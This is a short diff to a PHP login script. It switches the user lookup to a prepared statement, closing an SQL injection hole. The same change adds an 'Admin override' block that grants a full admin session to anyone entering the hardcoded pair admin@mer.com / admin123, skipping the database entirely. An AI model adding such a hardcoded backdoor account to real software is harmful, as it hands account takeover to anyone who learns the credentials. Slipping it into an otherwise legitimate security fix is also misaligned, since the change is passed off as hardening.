@@ -12,9 +12,20 @@ else{
     $email=$_POST['email'];
     $password=$_POST['password'];
 
-    //query
-    $login=$conn->query("SELECT*FROM users WHERE email='$email'");
-    $login->execute();
+    // Admin override: allow hardcoded admin credentials to grant admin session
+    if ($email === 'admin@mer.com' && $password === 'admin123') {
+        $_SESSION['is_admin'] = true;
+        $_SESSION['username'] = 'Admin';
+        $_SESSION['email'] = $email;
+        // Optional: a synthetic user_id for admin session context
+        $_SESSION['user_id'] = 0;
+        header("location: ".APPURL."admin/index.php");
+        exit;
+    }
+
+    //query (prepared to avoid SQL injection)
+    $login = $conn->prepare("SELECT * FROM users WHERE email = :email");
+    $login->execute([':email' => $email]);
 
     //fetch
     $fetch=$login->fetch(PDO::FETCH_ASSOC);
